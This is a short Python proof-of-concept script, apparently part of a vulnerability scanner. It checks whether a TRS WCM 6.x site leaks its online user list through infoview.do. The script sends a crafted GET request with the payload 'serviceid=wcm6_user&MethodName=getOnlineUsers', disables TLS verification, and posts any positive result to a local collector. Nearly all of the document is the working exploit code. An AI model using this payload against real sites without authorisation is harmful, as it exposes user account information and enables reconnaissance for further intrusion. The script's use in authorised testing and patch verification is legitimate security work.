#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS wcm 6.x版本infoview信息泄露
referer: http://www.wooyun.org/bugs/wooyun-2012-012957
author: Lucifer
description: 文件infoview.do中导致信息泄露。
'''
import sys
import requests
import warnings
from termcolor import cprint

class trs_wcm_infoview_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/wcm/infoview.do?serviceid=wcm6_user&MethodName=getOnlineUsers"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"<USERNAME>" in req.text and r"<Users>" in req.text:
                cprint("[+]存在TRS wcm 6.x版本infoview信息泄露漏洞...(中危)\tpayload: "+vulnurl, "yellow")
                postdata = {self.url:"存在TRS wcm 6.x版本infoview信息泄露漏洞...(中危)\tpayload: "+vulnurl}
                requests.post('http://localhost:8848/cms', json=postdata)
            else:
                cprint("[-]不存在trs_wcm_infoview_disclosure漏洞", "white", "on_grey")

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = trs_wcm_infoview_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()